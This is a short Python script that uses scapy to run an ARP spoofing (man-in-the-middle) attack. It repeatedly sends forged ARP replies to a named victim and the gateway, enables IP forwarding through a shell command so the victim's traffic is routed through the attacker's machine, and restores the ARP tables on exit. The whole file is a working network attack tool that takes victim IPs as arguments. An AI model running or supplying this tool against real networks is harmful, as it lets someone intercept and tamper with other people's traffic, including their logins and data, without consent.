#!/usr/bin/env python

import scapy.all as scapy
import argparse
import subprocess
import time
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", dest="victimIP", help="Victim IP Address")
    parser.add_argument("-g", "--gateway", dest="gatewayIP", help="Default Gateway IP Address")
    options = parser.parse_args()
    return options


def get_mac(ip):
    # Create a scapy ARP object and set the destination IP to ip arg passed
    arp_request = scapy.ARP(pdst=ip)

    # Create a scapy Ethernet object and set the MAC to the broadcast MAC
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # Append an ARP and Ethernet packet and store in new variable
    arp_request_broadcast = broadcast/arp_request

    # Send Ether/ARP request and save the ARP response (the response returns two list)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def send_response(spoofedIP, targetIP):
    # Generate an ARP Response
    # hwsrc = spoofed mac (scapy auto-populates from interface sent);
    # psrc  = spoofed IP
    # hwdst = target mac
    # pdst  = target IP where target means who is receiving the ARP request
    packet = scapy.ARP(op=2, pdst=spoofedIP, hwdst=get_mac(spoofedIP), psrc=targetIP)
    scapy.send(packet, verbose=False)


def start_forwarding():
    # Route the traffic from the victim to router using the linux command:
    # echo 1 > /proc/sys/net/ipv4/ip_forward
    # subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def restore(spoofedIP, targetIP):
    # Generate an ARP Response
    # hwsrc = spoofed mac (scapy auto-populates from interface sent)
    # psrc  = spoofed IP
    # hwdst = target mac
    # pdst  = target IP where target means who is receiving the ARP request
    packet = scapy.ARP(op=2, pdst=spoofedIP, hwsrc=get_mac(spoofedIP), hwdst=get_mac(targetIP), psrc=targetIP)
    scapy.send(packet, verbose=False)


options = get_arguments()
counter = 2
try:
    while True:
        send_response(options.victimIP, options.gatewayIP)
        send_response(options.gatewayIP, options.victimIP)
        if counter == 2:
            start_forwarding()
            print("[+] Packet forwarding enabled")
        counter = counter + 2
        # Dynamic printing
        print("\r[+] ARP Packets sent: " + str(counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] CTRL-C pressed..terminating program")
    print("[+] Restoring ARP Tables...")
    restore(options.victimIP, options.gatewayIP)
    restore(options.gatewayIP, options.victimIP)
    print("[+] Restore of ARP Tables is complete")